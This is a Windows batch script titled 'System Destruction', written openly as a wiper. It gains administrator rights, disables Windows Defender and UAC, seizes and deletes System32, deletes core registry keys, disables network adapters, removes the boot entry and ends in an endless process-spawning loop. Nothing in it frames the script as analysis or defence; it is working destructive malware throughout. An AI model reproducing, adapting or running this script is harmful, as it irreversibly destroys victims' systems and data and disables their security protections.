@echo off
title System Destruction
echo Initializing System Wipe...
timeout /t 5 /nobreak >nul

::1. Force Admin Privileges
:: If not running as admin, relaunch with admin rights
fltmc >nul 2>&1 || (
echo Requesting Administrator Permissions...
powershell start-process "%~0" -verb runAs
exit /b
)

::2. Disable Windows Defender
powershell -command "& {Set-MpPreference -DisableRealtimeMonitoring $true}" >nul 2>&1

::3. Disable User Account Control (UAC)
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f

::4. Take Ownership of System Files & Remove Protection
takeown /f C:\Windows\System32* /a /r /d y
icacls C:\Windows\System32* /grant Everyone:F /t /c /l /q

::5. Delete Critical System Files
del /f /q /s C:\Windows\System32*

::6. Corrupt Windows Registry
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion /f
reg delete HKLM\SYSTEM\CurrentControlSet\Services /f

::7. Disable Network Adapters
wmic path win32_networkadapter where PhysicalAdapter=True call disable

::8. Overwrite Boot Configuration (BCD)
bcdedit /delete {current} /f

::9. Create Endless Notepad Loop (Crash System)
:loop
start "" cmd.exe /c start "" cmd.exe
goto loop
